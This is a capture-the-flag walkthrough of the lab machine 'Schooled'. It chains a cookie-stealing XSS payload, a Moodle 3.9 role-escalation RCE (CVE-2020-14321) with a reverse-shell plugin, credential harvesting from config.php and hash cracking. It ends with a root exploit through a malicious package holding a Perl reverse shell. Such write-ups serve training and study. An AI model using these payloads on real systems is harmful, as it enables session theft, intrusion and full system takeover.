# Main points
* vhosts with gobuster
* XSS to steal teacher cookie
* Moodle RCE ver3.9 CVE-2020-14321
# Enumeration
We start with nmap scan
* 22/tcp    open     ssh     syn-ack     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
* 80/tcp    open     http    syn-ack     Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
* 33060/tcp open     mysqlx? syn-ack

Let's check the website
In the `/about.html` page, we see that they use Moodle for teaching
![Pasted image 20210727203524.png](/assets/Pasted%20image%2020210727203524.png)

So there is probably a moodle subdomain, something like `moodle.schooled.htb` or `moodle-app.schooled.htb` let's bruteforce with `gobuster`

```bash
gobuster vhost --url http://schooled.htb --wordlist /usr/share/wordlists/SecLists/DNS/subdomains-top1million-5000.txt
```

We found moodle subdomain `moodle.schooled.htb`
![Pasted image 20210727204456.png](/assets/Pasted%20image%2020210727204456.png)

Let's create an account (in the email, they only accept from domain `student.schooled.htb`)

![Pasted image 20210727205316.png](/assets/Pasted%20image%2020210727205316.png)

We enroll to the Math course and we see there is an Announcement
![Pasted image 20210727211040.png](/assets/Pasted%20image%2020210727211040.png)
Let's check the reminder
![Pasted image 20210727211055.png](/assets/Pasted%20image%2020210727211055.png)
![Pasted image 20210727211107.png](/assets/Pasted%20image%2020210727211107.png)

So we need to find this MoodleNet profile, and since the teacher will check all the profiles, we can steal his cookies and get a teacher account.

We go to our profile and edit the profile
![Pasted image 20210728001605.png](/assets/Pasted%20image%2020210728001605.png)

![Pasted image 20210728001622.png](/assets/Pasted%20image%2020210728001622.png)

We can see the `MoodleNet profile` field that the teacher will check, let's try and put an XSS payload.
`<img src=x onerror=document.location='http://10.10.14.64/?'+document.cookie;>`
Setup a python HTTP server and wait for the request, unrenrol and enroll again to the course to make the teacher check your MoodleNet Profile
![Pasted image 20210728003101.png](/assets/Pasted%20image%2020210728003101.png)

look at me, I am the teacher now
We copy the cookie and replace it in the browser devtool
![Pasted image 20210728003212.png](/assets/Pasted%20image%2020210728003212.png)
We go the main page
We are the teacher manuel philips
![Pasted image 20210728003326.png](/assets/Pasted%20image%2020210728003326.png)

Scroll down
![Pasted image 20210728003723.png](/assets/Pasted%20image%2020210728003723.png)
This redirects to the URL `https://docs.moodle.org/39/en/course/view/topics`
Which means this moodle version si `3.9`, let's look for vulnerabilities for it.

We find a moodle RCE as `CVE-2020-14321` according to [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce) we will need to escalate to Manager role to allow ourself to install plugin and install our php revshell as plugin
We find this PoC video
<iframe src="https://player.vimeo.com/video/441698193" width="640" height="380" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen></iframe>

Let's do the same, we start burp suite, and try to assign Manager role to the user student `Yamanak tameguchi` (our created user)

![Pasted image 20210728012730.png](/assets/Pasted%20image%2020210728012730.png)
Make sure to change these
![Pasted image 20210728013039.png](/assets/Pasted%20image%2020210728013039.png)
`userlist%5B%5D=<YOUR USER ID OF MANUEL PHILIPS>&roletoassign=1`

And our user is Manager
![Pasted image 20210728013128.png](/assets/Pasted%20image%2020210728013128.png)

We go to his profile and scroll down and click "Login as"
Now we are logged with Manager role
![Pasted image 20210728013303.png](/assets/Pasted%20image%2020210728013303.png)

And we have site administration
![Pasted image 20210728020100.png](/assets/Pasted%20image%2020210728020100.png)

Edit the Manager role and catch the request in burp suite, and replace the payload with the one in the github [repo](https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions) to get full permission as manager

From the repo download the zip, extract it, and replace the php file with the revshell from Pentestmonkey, and zip it again.

Now go to install plugin 
![Pasted image 20210728020811.png](/assets/Pasted%20image%2020210728020811.png)

And upload your zip file
![Pasted image 20210728020953.png](/assets/Pasted%20image%2020210728020953.png)
And install it

Setup a netcat listener
![Pasted image 20210728021005.png](/assets/Pasted%20image%2020210728021005.png)

And go to `http://moodle.schooled.htb/blocks/rce/lang/en/block_rce.php`

And we have a shell
![Pasted image 20210728021421.png](/assets/Pasted%20image%2020210728021421.png)

After a bit of looking around we find 2 users in `/etc/passwd` `jamie` and `steve`
Let's find `config.php` files to see if we can grab some creds
```bash
find / -iname "config.php" 2> /dev/null
```

![Pasted image 20210728023534.png](/assets/Pasted%20image%2020210728023534.png)

Let's check
`/usr/local/www/apache24/data/moodle/config.php`

```php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```

So now we have database MySQL creds
`moodle: PlaybookMaster2020`
Let's connect with `mysql`

```bash
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020
```
Let's see the tables of the database
![Pasted image 20210728024138.png](/assets/Pasted%20image%2020210728024138.png)

From the table we see table `mdl_user` let's check the content
```SQL
select * from mdl_user;
```

We have a lot of data, but we can see there is user and hash, let's take the hash of `steve` or `jamie`, whatever we find ^^
(I couldnt get full output so I used this command)

```bash
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e "use moodle; select * from mdl_user;" | grep jamie
```
We have the hash of jamie
`$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW`
Let's crack it with john
```bash
john hash -w /usr/share/wordlists/rockyou.txt --format=bcrypt
```

We have password of `jamie:!QAZ2wsx` 
We can ssh to it, and we have user flag

# Priv Esc
When we do `sudo -l` we see
![Pasted image 20210728030207.png](/assets/Pasted%20image%2020210728030207.png)
So we can install/update a package, so naturally we should try to make a malicious package and install it using `sudo`

We see on [GTFOBins](https://gtfobins.github.io/gtfobins/pkg/) that we can use `fpm` to compile a malicious package, let's create a reverse shell that will get us root

On your machine
```
TF=$(mktemp -d)
echo perl "-e" "'"'use Socket;$i="10.10.14.64";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"'" > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```
Download it on victim machine using `wget` or `curl` while setting your python HTTP Server.
Setup your netcat listener

On victim machine
```
sudo pkg install -y --no-repo-update ./x-1.0.txz
```
And we have root on our netcat listener
![Pasted image 20210728142434.png](/assets/Pasted%20image%2020210728142434.png)

And we have the flag

## Root hash
`$6$aHA/oB17Vb9TqNGn$GKTw/EWJfAl05/knP2YNId6xbyaAiGh.pfkeD5X/VQa/WtgI7jy5B7yO8Pvvyl1g3sbPATF3Mnn58sjXJgYAS0`